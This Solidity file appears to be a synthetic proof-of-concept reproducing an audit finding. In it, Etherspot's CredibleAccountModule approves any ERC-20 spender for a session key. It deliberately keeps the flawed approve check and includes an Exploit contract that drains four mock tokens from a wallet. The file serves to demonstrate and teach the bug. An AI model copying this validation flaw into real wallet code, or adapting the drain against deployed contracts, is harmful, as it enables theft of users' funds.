// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Etherspot — CredibleAccountModule lets a session key approve any spender
    (Shieldify, finding 62847).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _validateSingleCall returns true for every ERC-20 approve, with no
    check that the spender is the module or that the amount is inside the session lock.
    The session key approves itself and transferFroms the wallet's USDC, USDT, WETH,
    and WBTC. USDC was not in the lock. Vulnerable line preserved verbatim (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount && allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CredibleAccountModule {
    bytes4 public constant APPROVE = 0x095ea7b3;
    mapping(address => bool) public isSession;
    mapping(address => uint256) public lockedAmount;

    function addSession(address key) external {
        isSession[key] = true;
    }

    function setLock(address token, uint256 amount) external {
        lockedAmount[token] = amount;
    }

    function validate(address caller, address target, bytes calldata data) external view returns (bool) {
        if (!isSession[caller]) return false;
        return _validateSingleCall(target, data);
    }

    function _validateSingleCall(address target, bytes calldata _callData) internal view returns (bool) {
        bytes4 selector = bytes4(_callData);
        if (selector == APPROVE) return true; // @> VULN: approve of any spender and any amount is allowed
        // FIX: (address spender, uint256 amount) = abi.decode(_callData[4:], (address, uint256)); require(spender == address(this));
        if (target != address(this)) return false;
        return true;
    }
}

contract Wallet {
    CredibleAccountModule public module;

    constructor(CredibleAccountModule module_) {
        module = module_;
    }

    function execute(address target, bytes calldata data) external {
        require(module.validate(msg.sender, target, data), "session");
        (bool ok,) = target.call(data);
        require(ok, "exec");
    }
}

contract Exploit {
    Token public usdc; // nonce 1
    Token public usdt; // nonce 2
    Token public weth; // nonce 3
    Token public wbtc; // nonce 4
    CredibleAccountModule public module; // nonce 5
    Wallet public wallet; // nonce 6
    uint256 public profit;

    constructor() {
        usdc = new Token("USDC");
        usdt = new Token("USDT");
        weth = new Token("WETH");
        wbtc = new Token("WBTC");
        module = new CredibleAccountModule();
        wallet = new Wallet(module);
    }

    function _approve(Token token) internal {
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), type(uint256).max);
        wallet.execute(address(token), data);
    }

    function _pull(Token token, uint256 amount) internal {
        token.transferFrom(address(wallet), address(this), amount);
    }

    function run() external {
        module.addSession(address(this));
        module.setLock(address(usdt), 100 ether);
        module.setLock(address(weth), 1 ether);
        usdc.mint(address(wallet), 1000 ether);
        usdt.mint(address(wallet), 100 ether);
        weth.mint(address(wallet), 5 ether);
        wbtc.mint(address(wallet), 2 ether);
        _approve(usdc);
        _pull(usdc, 1000 ether);
        _approve(usdt);
        _pull(usdt, 100 ether);
        _approve(weth);
        _pull(weth, 5 ether);
        _approve(wbtc);
        _pull(wbtc, 2 ether);
        usdc.transfer(msg.sender, 1000 ether);
        profit = usdc.balanceOf(msg.sender);
        require(profit == 1000 ether, "usdc not drained");
        require(usdc.balanceOf(address(wallet)) == 0, "usdc left");
        require(usdt.balanceOf(address(wallet)) == 0, "usdt left");
        require(weth.balanceOf(address(wallet)) == 0, "weth left");
        require(wbtc.balanceOf(address(wallet)) == 0, "wbtc left");
        require(module.lockedAmount(address(usdc)) == 0, "usdc was inside the lock");
    }
}
